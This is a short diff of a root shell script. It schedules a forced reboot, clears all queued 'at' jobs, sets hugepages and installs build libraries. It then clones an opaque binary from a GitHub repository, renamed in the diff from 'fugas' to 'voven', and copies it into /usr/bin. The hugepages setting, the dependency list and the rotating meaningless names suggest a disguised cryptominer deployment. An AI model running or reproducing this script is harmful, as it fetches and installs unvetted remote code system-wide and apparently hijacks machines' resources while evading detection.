@@ -9,19 +9,19 @@ echo 'sudo reboot -f' | at now + 12 hours
 
 
 
-rm -rf /tmp/fugas/
+rm -rf /tmp/voven/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir fugas
-git clone https://github.com/kopchen/fugas.git /tmp/fugas
-cd /tmp/fugas
-chmod +x /tmp/fugas/fugas
+cd /tmp && mkdir voven
+git clone https://github.com/puhliker/voven.git /tmp/voven
+cd /tmp/voven
+chmod +x /tmp/voven/voven
 chmod 777 ./*.sh
-cp /tmp/fugas/fugas /usr/bin/
+cp /tmp/voven/voven /usr/bin/
 sleep 3
 
 
